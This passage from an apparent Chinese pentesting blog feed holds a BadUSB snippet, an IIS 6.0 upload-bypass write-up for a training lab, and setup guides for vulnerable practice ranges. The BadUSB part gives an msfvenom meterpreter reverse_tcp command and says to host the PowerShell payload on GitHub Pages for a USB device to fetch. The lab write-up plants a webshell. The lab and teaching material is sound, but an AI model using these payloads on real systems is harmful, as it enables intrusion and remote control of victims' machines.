id="00x6-badusb的其他骚操作"><a href="#00x6-badusb的其他骚操作" class="headerlink" title="00x6 badusb的其他骚操作. 　　"></a>00x6 badusb的其他骚操作. 　　</h1><h1 id="00x7-MSF利用powershell进行渗透（不需要远程服务器了-把他直接放在我们的github仓库）"><a href="#00x7-MSF利用powershell进行渗透（不需要远程服务器了-把他直接放在我们的github仓库）" class="headerlink" title="00x7 MSF利用powershell进行渗透（不需要远程服务器了,把他直接放在我们的github仓库）.　　"></a>00x7 MSF利用powershell进行渗透（不需要远程服务器了,把他直接放在我们的github仓库）.　　</h1><h3 id="骚年，你是否在为买不起服务器而苦恼，你又是否在为自己的钱包心疼-如果都有，那么请你看看这种骚操作"><a href="#骚年，你是否在为买不起服务器而苦恼，你又是否在为自己的钱包心疼-如果都有，那么请你看看这种骚操作" class="headerlink" title="骚年，你是否在为买不起服务器而苦恼，你又是否在为自己的钱包心疼.如果都有，那么请你看看这种骚操作."></a>骚年，你是否在为买不起服务器而苦恼，你又是否在为自己的钱包心疼.如果都有，那么请你看看这种骚操作.</h3><p>我们可以把我们的远程服务器替换为github仓库,这个东西其实跟远程服务器是一样的,同时我们还能获取免费的guthub二级域名.<br>如果你没有远程服务器,github仓库绝对是你的不二之选.<br>这个怎么创建和放到github仓库我就不教了,要善用搜索引擎[滑稽]　　</p><h3 id="如果你已经看了我上面的教程那么，这里对于你来说一样简单，我们要修改的地方不多，让我给你介绍下"><a href="#如果你已经看了我上面的教程那么，这里对于你来说一样简单，我们要修改的地方不多，让我给你介绍下" class="headerlink" title="如果你已经看了我上面的教程那么，这里对于你来说一样简单，我们要修改的地方不多，让我给你介绍下　　"></a>如果你已经看了我上面的教程那么，这里对于你来说一样简单，我们要修改的地方不多，让我给你介绍下　　</h3><p>1.修改MSF中生成木马的语句，如下　　</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;XXXXX（kali本机IP） LPORT&#x3D;XXXX（监听端口） -f psh-reflection &gt;xxx.ps1  </span><br></pre></td></tr></table></figure><p>然后将生成出来的ps1文件放到github仓库上<br>Arduino的命令并没有改变,就将你要填的远程服务器的地址改为你的github.io二级域名就OK<br>监听程序还是万年不变的,如果你发现建立了通话而没有拿到shell,那就seesion -i 看看.    </p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> 近源渗透 </category>
          
          <category> badusb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> 近源渗透 </tag>
            
            <tag> badusb </tag>
            
            <tag> MSF </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>墨者学院内部文件上传系统漏洞分析溯源WP</title>
      <link href="2020/11/08/%E5%A2%A8%E8%80%85WP%E5%86%85%E9%83%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90/"/>
      <url>2020/11/08/%E5%A2%A8%E8%80%85WP%E5%86%85%E9%83%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="墨者学院内部文件上传系统漏洞分析溯源"><a href="#墨者学院内部文件上传系统漏洞分析溯源" class="headerlink" title="墨者学院内部文件上传系统漏洞分析溯源"></a>墨者学院内部文件上传系统漏洞分析溯源</h1><h3 id="本文出自JoCat原创作品，未经作者许可禁止转发，文章内容仅限交流学习，有问题可以联系QQ1506610991"><a href="#本文出自JoCat原创作品，未经作者许可禁止转发，文章内容仅限交流学习，有问题可以联系QQ1506610991" class="headerlink" title="本文出自JoCat原创作品，未经作者许可禁止转发，文章内容仅限交流学习，有问题可以联系QQ1506610991"></a>本文出自JoCat原创作品，未经作者许可禁止转发，文章内容仅限交流学习，有问题可以联系QQ1506610991</h3><p>这是墨者的介绍<br> 背景介绍<br>在为某公司检测后台页面时，你发现了一个上传页面，该页面做了一些防护，你需要尝试绕过并上传webshell，以获得 网站根目录访问权限<br>实训目标  </p><p>1、熟悉常见中间件存在的解析漏洞；<br>2、熟悉一句话木马的使用与制作<br>3、熟悉常见的上传漏洞利用方法<br>解题方向  </p><p>1、试探允许上传的文件类型<br>2、观察服务器在处理完上传任务后返回的内容，获取上传路径<br>3、尝试修改上传路径，观察服务器是否允许写入权限<br><img src="https://i.loli.net/2020/04/16/O38VaojANTdsxEc.png" alt="QQ截图20200416215242.png"><br>打开靶场我们可以看见有一个上传点<br><img src="https://i.loli.net/2020/04/16/jSzUZGnb5CfTLoc.png" alt="QQ截图20200416215258.png"><br>老规矩,先打开bp测试抓包<br><img src="https://i.loli.net/2020/04/16/j9daAPyp418F7zM.png" alt="QQ截图20200416215316.png"><br><img src="https://i.loli.net/2020/04/16/lTkBZMun6fxFDH8.png" alt="QQ截图20200416215333.png"><br>我们先让看看报错信息<br><img src="https://i.loli.net/2020/04/16/lNqxJXK9aEvFk4H.png" alt="QQ截图20200416220934.png"><br>有意思哦，IIS6.0服务器，那我们肯定想到的就是IIS6.0的各大漏洞<br>IIS6.0解析漏洞?<br>iis6.0远程代码执行漏洞复现(CVE-2017-7269)?<br>IIS6.0缓冲区溢出漏洞(CVE-2017-7269)?<br>结合信息来看，应该就是IIS6.0文件解析漏洞了<br>当然解析分两种    </p><ol><li>目录解析<br>以*.asp命名的文件夹里的文件都将会被当成ASP文件执行.  </li><li>文件解析    </li></ol><p>*.asp;.jpg 像这种畸形文件名在“;”后面的直接被忽略，也就是说当成 *.asp文件执行.<br>我们依次测试，这里我就直接给出答案了，这题存在目录解析漏洞.<br><img src="https://i.loli.net/2020/04/16/HxtDVvOhEYMynUe.png" alt="QQ截图20200416220805.png"><br>在这个包里，我们的GUFolderPath是可控的，所以我们就可以改为a.asp然后上传文件<br>然后就可以上传文件了，这里可以直接上传txt文件解析成asp文件连接.就不需要再合成图片马了，这个靶场还有文件名后缀过滤与文件重命名~<br><img src="https://i.loli.net/2020/04/16/cJk8vNaS42Q5oms.png" alt="QQ截图20200416215456.png"><br><img src="https://i.loli.net/2020/04/16/taYTrh2s89KROqX.png" alt="QQ截图20200416221133.png"><br><img src="https://i.loli.net/2020/04/16/TBYWtOXF1oK9VsD.png" alt="QQ截图20200416221143.png"><br>然后我们就用菜刀连接即可，蚁剑和冰蝎好像都不能直连(没做测试)菜刀怎么使用我就不介绍了，以后会出一期专门介绍各种Webshell工具的教程<br><img src="https://i.loli.net/2020/04/16/nYmUOTQDJNv5tua.png" alt="QQ截图20200416222336.png"><br><img src="https://i.loli.net/2020/04/16/9NpjI32wFJSAPoi.png" alt="QQ截图20200416222408.png"><br><img src="https://i.loli.net/2020/04/16/IziWtOH1QdNvqpb.png" alt="QQ截图20200416222422.png"><br>这样我们就拿到KEY啦，难度不大，关键是要熟悉各大版本IIS的漏洞~</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> 墨者学院 </category>
          
          <category> CMS漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> 墨者学院WP </tag>
            
            <tag> CMS漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶场搭建一_DVWA</title>
      <link href="2020/11/08/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E4%B8%80_DVWA/"/>
      <url>2020/11/08/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E4%B8%80_DVWA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶场搭建一-DVWA"><a href="#靶场搭建一-DVWA" class="headerlink" title="靶场搭建一_DVWA"></a>靶场搭建一_DVWA</h1><h2 id="文章出自JoCat-QQ：1506610991-有渗透测试需求及商务合作请联系-x4a-111-x43-x61-x74-x57-70-x59-64-49-54-x33-x2e-x63-111-x6d"><a href="#文章出自JoCat-QQ：1506610991-有渗透测试需求及商务合作请联系-x4a-111-x43-x61-x74-x57-70-x59-64-49-54-x33-x2e-x63-111-x6d" class="headerlink" title="文章出自JoCat QQ：1506610991 有渗透测试需求及商务合作请联系&#x4a;&#111;&#x43;&#x61;&#x74;&#x57;&#70;&#x59;&#64;&#49;&#54;&#x33;&#x2e;&#x63;&#111;&#x6d;"></a>文章出自JoCat QQ：1506610991 有渗透测试需求及商务合作请联系<a href="mailto:&#x4a;&#111;&#x43;&#x61;&#x74;&#x57;&#70;&#x59;&#64;&#49;&#54;&#x33;&#x2e;&#x63;&#111;&#x6d;">&#x4a;&#111;&#x43;&#x61;&#x74;&#x57;&#70;&#x59;&#64;&#49;&#54;&#x33;&#x2e;&#x63;&#111;&#x6d;</a></h2><h3 id="本文可能存在攻击性-请勿用于非法用途-仅用于技术交流-一切责任与本人无关-如有不足的地方希望指点"><a href="#本文可能存在攻击性-请勿用于非法用途-仅用于技术交流-一切责任与本人无关-如有不足的地方希望指点" class="headerlink" title="本文可能存在攻击性,请勿用于非法用途.仅用于技术交流,一切责任与本人无关,如有不足的地方希望指点"></a>本文可能存在攻击性,请勿用于非法用途.仅用于技术交流,一切责任与本人无关,如有不足的地方希望指点</h3><p>最近有很多朋友在催我的文章,靶场搭建等等,今天我就来把靶场搭建文章出啦~</p><h2 id="1-DVWA简介"><a href="#1-DVWA简介" class="headerlink" title="1.DVWA简介"></a>1.DVWA简介</h2><p>官网：<a href="http://www.dvwa.co.uk/">http://www.dvwa.co.uk/</a><br>这是官网简介<br><img src="https://i.loli.net/2020/05/01/eQagHCkfZL4hKc7.png" alt="QQ截图20200501110504.png"><br>翻译过来大概意思是这样的<br><img src="https://i.loli.net/2020/05/01/m7dXsO6fibp5lYv.png" alt="QQ截图20200501110801.png"><br>（DVWA）是一个易受攻击的PHP/MySQL Web应用程序.其主要目标是帮助安全专业人员在法律环境中测试他们的技能和工具,帮助Web开发人员更好地了解保护Web应用程序的过程,并帮助教师/学生在课堂环境中教授/学习Web应用程序安全性.<br>简单来说就是一个靶场~<br>然后我们就开始搭建吧<br>先下载安装包：<a href="https://github.com/ethicalhack3r/DVWA/archive/master.zip">https://github.com/ethicalhack3r/DVWA/archive/master.zip</a>  (官网)<br>百度网盘链接：<a href="https://pan.baidu.com/s/15LZy7IvO0fVZjv4CYxPDlg">https://pan.baidu.com/s/15LZy7IvO0fVZjv4CYxPDlg</a> 提取码：olpm<br>百度网盘近期我准备换成Onedrive或者是谷歌的云盘了,所以百度网盘的资源以后就不用了   </p><h2 id="2-搭建"><a href="#2-搭建" class="headerlink" title="2.搭建"></a>2.搭建</h2><p>在这里我们主要是在Windows环境下搭建,所以就直接使用PHPstudy了<br>而在linux或者其他环境下搭建的教程如果有朋友想看我也会出一期<br>phpstudy官网：<a href="https://www.xp.cn/">https://www.xp.cn/</a><br>这里我们选择最新版下载,而老版的是有后门漏洞的~<br><img src="https://i.loli.net/2020/05/01/EiNAdS1g7aqkeTR.png" alt="QQ截图20200501111724.png"><br>然后点击exe安装,注意安装路径不要有中文,并且记住这个路径~<br>打开exe,你会看到这个界面,不着急,我们先来把我们的文件配置好~<br>打开你刚才记住的路径,如图<br><img src="https://i.loli.net/2020/05/01/tVCZ4FTNuWfaycJ.png" alt="QQ截图20200501112127.png"><br>(请忽略我这这么多靶场)<br>如果是刚安装这个WWW的文件夹里应该会有很多文件,不用管他,全部删掉~<br>然后在WWW目录下新建一个名字为dvwa的文件夹,如图<br><img src="https://i.loli.net/2020/05/01/Aq2zierQaPNflyO.png" alt="QQ截图20200501112358.png"><br>然后把你刚才下载下来的DVWA的压缩包zip解压进去~<br><img src="https://i.loli.net/2020/05/01/LGD9EQhzaixymYl.png" alt="QQ截图20200501112520.png"><br>然后可以把压缩包删除了,把你dvwa-master文件夹里的文件复制到你WWW目录下的dvwa文件夹里<br><img src="https://i.loli.net/2020/05/01/cBnCDLJbwKWQsEI.png" alt="QQ截图20200501112729.png"><br>现在你就可以再打开phpstudy了,然后操作如图<br><img src="https://i.loli.net/2020/05/01/CsESiJ6XrxeDHqU.png" alt="QQ截图20200501112830.png"><br>接下来访问<a href="http://localhost/dvwa">http://localhost/dvwa</a> 你应该能看到如图所示的网页<br><img src="https://i.loli.net/2020/05/01/UOIsZd3LMkAiFzj.png" alt="QQ截图20200501113223.png"><br>那么我们就按他说的操作即可,再回到我们的WWW/dvwa文件夹下<br><img src="https://i.loli.net/2020/05/01/N3eM4pwXbaUKvV8.png" alt="QQ截图20200501113406.png"><br>配置config.inc.php.dist文件<br><img src="https://i.loli.net/2020/05/01/Lw4l3hPvfiBFQgX.png" alt="QQ截图20200501114543.png"><br>数据库密码在phpstduy的数据库找,如图<br><img src="https://i.loli.net/2020/05/01/s4ZVWexHIza7OAG.png" alt="QQ截图20200501114715.png"><br>操作如图,然后把config.inc.php.dist文件的.dist文件后缀删除改为config.inc.php如图<br><img src="https://i.loli.net/2020/05/01/Il2iqaQBfpKtvmP.png" alt="QQ截图20200501114807.png"><br>然后我们要在phpstduy里配置下数据库,操作如图<br><img src="https://i.loli.net/2020/05/01/BAHDIxnWsVNmgh6.png" alt="QQ截图20200501115101.png"><br>然后再访问<a href="http://localhost/dvwa/login.php">http://localhost/dvwa/login.php</a><br>默认账号密码 admin/password<br>登陆进去后可以看到如下网页<br><img src="https://i.loli.net/2020/05/01/pq7bYwB4QSDMo2K.png" alt="QQ截图20200501115745.png"><br>然后我们发现PHP function allow_url_include: Disabled<br>PHP函数allow_url_include：禁用<br>所以我们要进phpstudy里的配置来更改<br><img src="https://i.loli.net/2020/05/01/u8tzCEpRDQKPJd2.png" alt="QQ截图20200501120718.png"><br>记住版本号,访问相应版本号的php配置文件<br>我们的路径和操作如图~<br><img src="https://i.loli.net/2020/05/01/UMSWBcFiV3bnqof.png" alt="QQ截图20200501120927.png"><br><img src="https://i.loli.net/2020/05/01/SHWZGJaXn295kcI.png" alt="20190717130814203.png"><br>然后就能解决了</p><h3 id="然后我们还要再配置config-inc-php-dist文件"><a href="#然后我们还要再配置config-inc-php-dist文件" class="headerlink" title="然后我们还要再配置config.inc.php.dist文件"></a>然后我们还要再配置config.inc.php.dist文件</h3><ol><li>先访问<a href="https://www.google.com/recaptcha/admin/create">https://www.google.com/recaptcha/admin/create</a><br>这里要有谷歌账号<br><img src="https://i.loli.net/2020/05/01/pkJmoPsKYz79Zv4.png" alt="QQ截图20200501121747.png">   </li><li>生成密钥,更改对应config文件<br>然后点击确认,再访问<a href="http://localhost/dvwa/login.php">http://localhost/dvwa/login.php</a> 登陆<br><img src="https://i.loli.net/2020/05/01/vWcKYt2TEbsMOzw.png" alt="QQ截图20200501122654.png"><br>如图已经成功修改~<br>然后点击!<br><img src="https://i.loli.net/2020/05/01/NDyFXUqonebl1aR.png" alt="QQ截图20200501122808.png"><br>即可完成搭建~~<h2 id="3-搭建好后的设置"><a href="#3-搭建好后的设置" class="headerlink" title="3.搭建好后的设置"></a>3.搭建好后的设置</h2><a href="http://localhost/dvwa/login.php">http://localhost/dvwa/login.php</a>  登陆<br>然后你就可以看到如图所示网页<br><img src="https://i.loli.net/2020/05/01/69oTkbzXyGLDxAu.png" alt="QQ截图20200501123128.png"><br>证明你搭建成功啦<del>~<br><img src="https://i.loli.net/2020/05/01/ZrnW26DPhcejmIK.png" alt="QQ截图20200501123329.png"><br>这是关于靶场的简要介绍,剩下的更多功能可以自己探索</del><br>而如果有朋友需要我出关于DVWA的靶场的通关的教程的话我以后也会出一期的<br>搭建过程中遇到其他问题也可以加我QQ1506610991问我<br>不过希望各位师傅打赏菜鸡一点钱,用爱发电很累~~  </li></ol>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> 靶场搭建系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> 靶场搭建 </tag>
            
            <tag> DVWA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶场搭建三_upload与sqli-labs与webug4.0</title>
      <link href="2020/11/08/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E4%B8%89_upload-lab%E4%B8%8Esqli-labs%E4%B8%8EWebug4.0/"/>
      <url>2020/11/08/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E4%B8%89_upload-lab%E4%B8%8Esqli-labs%E4%B8%8EWebug4.0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶场搭建三-upload与sqli-labs与webug4-0"><a href="#靶场搭建三-upload与sqli-labs与webug4-0" class="headerlink" title="靶场搭建三_upload与sqli-labs与webug4.0"></a>靶场搭建三_upload与sqli-labs与webug4.0</h1><h2 id="文章出自JoCat-QQ：1506610991-有渗透测试需求及商务合作请联系-74-111-67-x61-116-x57-70-x59-x40-x31-54-x33-46-99-111-109"><a href="#文章出自JoCat-QQ：1506610991-有渗透测试需求及商务合作请联系-74-111-67-x61-116-x57-70-x59-x40-x31-54-x33-46-99-111-109" class="headerlink" title="文章出自JoCat QQ：1506610991 有渗透测试需求及商务合作请联系&#74;&#111;&#67;&#x61;&#116;&#x57;&#70;&#x59;&#x40;&#x31;&#54;&#x33;&#46;&#99;&#111;&#109;"></a>文章出自JoCat QQ：1506610991 有渗透测试需求及商务合作请联系<a href="mailto:&#74;&#111;&#67;&#x61;&#116;&#x57;&#70;&#x59;&#x40;&#x31;&#54;&#x33;&#46;&#99;&#111;&#109;">&#74;&#111;&#67;&#x61;&#116;&#x57;&#70;&#x59;&#x40;&#x31;&#54;&#x33;&#46;&#99;&#111;&#109;</a></h2><h3 id="本文可能存在攻击性-请勿用于非法用途-仅用于技术交流-一切责任与本人无关-如有不足的地方希望指点"><a href="#本文可能存在攻击性-请勿用于非法用途-仅用于技术交流-一切责任与本人无关-如有不足的地方希望指点" class="headerlink" title="本文可能存在攻击性,请勿用于非法用途.仅用于技术交流,一切责任与本人无关,如有不足的地方希望指点"></a>本文可能存在攻击性,请勿用于非法用途.仅用于技术交流,一切责任与本人无关,如有不足的地方希望指点</h3><p>今天来更新下靶场搭建系列,今天一共介绍三个靶场,由于三个靶场的搭建等都没有太大难度,与前两篇的操作基本一致,所以我就放在一起来写啦,我也想尽快完结这个系列,然后开始讲一些内网域渗透之类了~</p><h1 id="1-Webug4-0靶场"><a href="#1-Webug4-0靶场" class="headerlink" title="1.Webug4.0靶场"></a>1.Webug4.0靶场</h1><h2 id="1-1-下载及简介"><a href="#1-1-下载及简介" class="headerlink" title="1.1 下载及简介"></a>1.1 下载及简介</h2><p>GitHub地址：<a href="https://github.com/wangai3176/webug4.0">https://github.com/wangai3176/webug4.0</a><br>Github简介<br><img src="https://i.loli.net/2020/05/24/Y8GWLqCQs4hDIxk.png" alt="QQ截图20200524003715.png"><br>Webug这款靶场在github也是有百星的热门靶场,其搭建分为两种版本分别为如图所示两种<br><img src="https://i.loli.net/2020/05/24/SY6TFB1UM4Q3IJc.png" alt="QQ截图20200524004553.png"></p><h2 id="1-2搭建"><a href="#1-2搭建" class="headerlink" title="1.2搭建"></a>1.2搭建</h2><ol><li>源码版的搭建与我们之前介绍的DVWA和Pikachu基本一致<br>使用phpstduy.将我们的靶场源码放在/WWW目录下<br>同时在我们的数据库内导入sql文件,再访问<a href="http://localhost/webug">http://localhost/webug</a> 即可<br>如果还有问题可以观看github上给的百度云下的exe视频,上面也有很详细的介绍</li><li>虚拟机版搭建更加容易<br>你需要先有VMware虚拟机软件,然后点击安装包内的虚拟机文件<br>使用Vmware打开,Vmware就会自动询问你相关事项,你只需要注意安装的地址即可<br>等到虚拟机扫描完成后,使用直接连接的网络模式,即可打开虚拟机,在cmd下输入ipconfig查询你的IP<br>然后在浏览器输入你虚拟机的IP就可以访问Webug靶场了<br>如果还有不清楚的,压缩包内也有关于虚拟机靶场搭建的视频,可以去看看,再不懂的可以加我QQ问我<h1 id="2-upload靶场"><a href="#2-upload靶场" class="headerlink" title="2.upload靶场"></a>2.upload靶场</h1><h2 id="2-1下载及简介"><a href="#2-1下载及简介" class="headerlink" title="2.1下载及简介"></a>2.1下载及简介</h2>Github地址：<a href="https://github.com/Tj1ngwe1/upload-labs">https://github.com/Tj1ngwe1/upload-labs</a><br>Github简介<br><img src="https://i.loli.net/2020/05/24/d1Qnm8ehZJUfIb7.png" alt="QQ截图20200524005846.png"><br>upload-labs主要是一款用来锻炼你对于文件上传漏洞的利用的靶场<br>靶场中有很多关卡,每个关卡里面也都有关于各种上传的方式的总结<br>每一关还给你贴心的放上了提示与查看源码的功能<br>所以我很推荐对于文件上传漏洞不熟悉的朋友们去刷下这个靶场~<br>本次在这里我们还是使用phpstduy来进行win环境下的搭建  <h2 id="2-2搭建"><a href="#2-2搭建" class="headerlink" title="2.2搭建"></a>2.2搭建</h2></li><li>先从github上下载下来源码压缩包,解压到phpstduy/WWW目录下,如图<br><img src="https://i.loli.net/2020/05/24/iXBmf2DS1vcQJzK.png" alt="QQ截图20200524010650.png"><br><img src="https://i.loli.net/2020/05/24/PmBTfFKCOhlp1Sw.png" alt="QQ截图20200524010737.png">  </li><li>启动phpstduy,访问<a href="http://localhost/upload-lib">http://localhost/upload-lib</a><br><img src="https://i.loli.net/2020/05/24/7djpN3hQ18gX25o.png" alt="QQ截图20200524011018.png"><br>这样就搭建完成了~</li><li>关卡内的一些介绍<br><img src="https://i.loli.net/2020/05/24/ZFEIxkj3o8wGNTt.png" alt="QQ截图20200524011222.png"><h1 id="3-sqli-labs靶场"><a href="#3-sqli-labs靶场" class="headerlink" title="3.sqli-labs靶场"></a>3.sqli-labs靶场</h1><h2 id="3-1下载及简介"><a href="#3-1下载及简介" class="headerlink" title="3.1下载及简介"></a>3.1下载及简介</h2>Github地址：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br>Github简介<br><img src="https://i.loli.net/2020/05/24/aQU7MhKZN1fRVXw.png" alt="QQ截图20200524011349.png"><br>意思大概是   </li></ol><p>SQLI-LABS是一个学习SQLI的平台,下面介绍了GET和POST场景的实验：</p><pre><code> 基于错误的注入（联合选择）     字符串     整数 基于错误的注入（基于双注入） 盲注：1.基于布尔2.基于时间 更新查询注入. head查询注入. 标头注入. 1.基于Referer based. 2.基于UserAgent. 3.基于Cookie. 二阶注射 绕过WAF     绕过黑名单过滤器剥离注释剥离OR＆AND剥离空间和注释剥离UNION和SELECT     预期失配(Impidence mismatch) 绕开addslashes() 绕过mysql_real_escape_string.(在特殊条件下) 堆叠的SQL注入. 辅助通道提取</code></pre><h2 id="3-2搭建"><a href="#3-2搭建" class="headerlink" title="3.2搭建"></a>3.2搭建</h2><ol><li>先从github上下载下来源码压缩包,解压到phpstduy/WWW目录下,如图<br><img src="https://i.loli.net/2020/05/24/c4sCf61l29IHDia.png" alt="QQ截图20200524012252.png"><br><img src="https://i.loli.net/2020/05/24/JHe3xoC1Lplq79u.png" alt="QQ截图20200524012346.png">  </li><li>启动phpstduy,访问<a href="http://localhost/sqli-labs">http://localhost/sqli-labs</a><br><img src="https://i.loli.net/2020/05/24/Tan6bqoOC5mD2ce.png" alt="QQ截图20200524012710.png"><br>就完成啦~<br>而sqli-labs里面有非常多的sql注入漏洞的练习<br>无论 是大佬还是小白,都可以使用手工注入或者工具等方式来测试自己在sql注入漏洞这方面的知识<del>我也很推荐大家去刷这个靶场</del>  <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1>这样我们的三期面向小白的靶场搭建系列就写完啦,其实写这三篇靶场搭建的初衷就是为了让小白能在学习渗透时对于如何选择自己的靶场进行知识的练习,因为靶场是最安全,最无风险的练习方式,同时你也能通过对于靶场的练习,了解到对于漏洞的形成与防御,这样你也会有很大的提升~</li></ol>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
          <category> 靶场搭建系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> sql注入漏洞 </tag>
            
            <tag> 靶场搭建 </tag>
            
            <tag> 文件上传漏洞 </tag>
            
            <tag> Webug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>靶场搭建二_Pikachu</title>
      <link href="2020/11/08/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E4%BA%8C_Pikachu/"/>
      <url>2020/11/08/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E4%BA%8C_Pikachu/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶场搭建二-Pikachu"><a href="#靶场搭建二-Pikachu" class="headerlink" title="靶场搭建二_Pikachu"></a>靶场搭建二_Pikachu</h1><h2 id="文章出自JoCat-QQ：1506610991-有渗透测试需求及商务合作请联系-x4a-111-x43-x61-116-x57-70-89-64-49-x36-x33-46-x63-111-109"><a href="#文章出自JoCat-QQ：1506610991-有渗透测试需求及商务合作请联系-x4a-111-x43-x61-116-x57-70-89-64-49-x36-x33-46-x63-111-109" class="headerlink" title="文章出自JoCat QQ：1506610991 有渗透测试需求及商务合作请联系&#x4a;&#111;&#x43;&#x61;&#116;&#x57;&#70;&#89;&#64;&#49;&#x36;&#x33;&#46;&#x63;&#111;&#109;"></a>文章出自JoCat QQ：1506610991 有渗透测试需求及商务合作请联系<a href="mailto:&#x4a;&#111;&#x43;&#x61;&#116;&#x57;&#70;&#89;&#64;&#49;&#x36;&#x33;&#46;&#x63;&#111;&#109;">&#x4a;&#111;&#x43;&#x61;&#116;&#x57;&#70;&#89;&#64;&#49;&#x36;&#x33;&#46;&#x63;&#111;&#109;</a></h2><h3 id="本文可能存在攻击性-请勿用于非法用途-仅用于技术交流-一切责任与本人无关-如有不足的地方希望指点"><a href="#本文可能存在攻击性-请勿用于非法用途-仅用于技术交流-一切责任与本人无关-如有不足的地方希望指点" class="headerlink" title="本文可能存在攻击性,请勿用于非法用途.仅用于技术交流,一切责任与本人无关,如有不足的地方希望指点"></a>本文可能存在攻击性,请勿用于非法用途.仅用于技术交流,一切责任与本人无关,如有不足的地方希望指点</h3><p>好久不见,距离五一又过去了好久,我的blog也咕咕咕了好久~<br>但是我还是准备把这个系列写完整,给萌新小白指路,今天我们就来介绍另一个dalao开发的靶场Pikachu   </p><h2 id="1-项目地址：https-github-com-zhuifengshaonianhanlu-pikachu"><a href="#1-项目地址：https-github-com-zhuifengshaonianhanlu-pikachu" class="headerlink" title="1. 项目地址：https://github.com/zhuifengshaonianhanlu/pikachu"></a>1. 项目地址：<a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></h2><p>支持作者的可以点个star~<br>简介如下<br><img src="https://i.loli.net/2020/05/10/c7pnIN8WRAZ4GM5.png" alt="QQ截图20200510092337.png"><br>可以看到Pikachu靶场支持的漏洞类型很多,最重要的是他不像DVWA一样是全英文,的对于新手来说是很不错的靶场~<br>我们可以从github上下载,链接如下：<a href="https://github.com/zhuifengshaonianhanlu/pikachu/archive/master.zip">https://github.com/zhuifengshaonianhanlu/pikachu/archive/master.zip</a></p><h2 id="2-开始搭建吧"><a href="#2-开始搭建吧" class="headerlink" title="2. 开始搭建吧~"></a>2. 开始搭建吧~</h2><p>我们这里还是在windows环境下进行搭建<br>如果你是linux用户,那么搭建也十分容易,使用Docker即可快速搭建<br>语句如下<br>    docker build -t “pikachu”<br>    docker run -d -p8080:80 pikachu<br>Windows我们和上期一样,使用phpstudy进行搭建。<br>phpstudy 的安装等教程我就不详细介绍了,在上一篇文章中已经讲的很清楚啦~<br>链接如下：<a href="https://jocatw.github.io/2020/05/01/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E4%B8%80_DVWA/">https://jocatw.github.io/2020/05/01/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E4%B8%80_DVWA/</a></p><ol><li>首先我们打开我们phpstudy安装地址下的WWW文件夹,新建一个目录名为Pikachu,并把我们下载下来的压缩包解压进去如图<br><img src="https://i.loli.net/2020/05/10/ldqf628rmowWEiV.png" alt="QQ截图20200510094035.png"><br><img src="https://i.loli.net/2020/05/10/oLPcmB3A4kvnqNZ.png" alt="QQ截图20200510094133.png">  </li><li>我们再来配置配置文件如图<br><img src="https://i.loli.net/2020/05/10/IztB4AU7KjD8Ffe.png" alt="QQ截图20200510094414.png"><br><img src="https://i.loli.net/2020/05/10/v3UtTf9k5xsCYjM.png" alt="QQ截图20200510094519.png">  </li><li>然后我们打开phpstudy,启动<br><img src="https://i.loli.net/2020/05/10/aNL2JjQlE7eAifH.png" alt="QQ截图20200510094703.png"></li><li>访问<a href="http://localhost/pikachu">http://localhost/pikachu</a>  (如图)<br><img src="https://i.loli.net/2020/05/10/bFe3vNOQKZgu7Wy.png" alt="QQ截图20200510094852.png">  </li><li>点击之后,网页有如图所示提示,点击即可~<br><img src="https://i.loli.net/2020/05/10/E1cO36tn4dbJ9RV.png" 